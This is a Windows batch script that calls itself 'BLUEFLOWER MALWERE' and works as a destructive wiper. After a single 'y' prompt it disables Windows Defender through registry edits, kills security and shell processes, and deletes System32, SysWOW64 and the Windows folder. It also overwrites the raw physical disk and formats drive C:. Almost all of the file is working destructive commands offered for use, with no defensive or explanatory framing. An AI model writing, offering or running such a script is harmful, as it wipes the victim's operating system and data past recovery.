@echo off
title BLUEFLOWER MALWERE
color 4f
cls

echo.
echo                  ██████╗ ██╗   ██╗███████╗
echo                  ██╔══██╗██║   ██║██╔════╝
echo                  ██████╔╝██║   ██║█████╗  
echo                  ██╔══██╗██║   ██║██╔══╝  
echo                  ██████╔╝╚██████╔╝███████╗
echo                  ╚═════╝  ╚═════╝ ╚══════╝
echo.
echo                 THIS WILL DESTROY WINDOWS IN <8 SECONDS
set /p "choice=                Type y to kill instantly → "

if /i not "%choice%"=="y" (cls & echo Canceled. & timeout 3 >nul & exit)

powershell -ep bypass -c "Set-ExecutionPolicy Unrestricted -Force" >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
taskkill /f /im explorer.exe /im taskmgr.exe /im MsMpEng.exe >nul 2>&1

takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant Administrators:F /t /c /q >nul 2>&1
rd /s /q C:\Windows\System32 >nul 2>&1
rd /s /q C:\Windows\SysWOW64 >nul 2>&1
rd /s /q C:\Windows >nul 2>&1

powershell -c "$d=New-Object IO.FileStream('\\.\PhysicalDrive0','Open','Write');$b=[byte[]](0..255)*40960;$d.Write($b,0,$b.Length);$d.Close()" >nul 2>&1

start "" /b cmd /c "echo y|format C: /fs:NTFS /q /v:BLUEFLOWER >nul 2>&1"

powershell -c "[Console]::Beep(32767,200);$v=New-Object -ComObject Sapi.SpVoice;$v.Rate=20;$v.Speak('LIGHTNING DEATH COMPLETE')" >nul 2>&1

cls
echo.
echo                  LIGHTNING DEATH = EXECUTED
echo                  WINDOWS = DEAD IN <8 SECONDS
echo                  DRIVE  = BEING FORMATTED
timeout /t 999 >nul

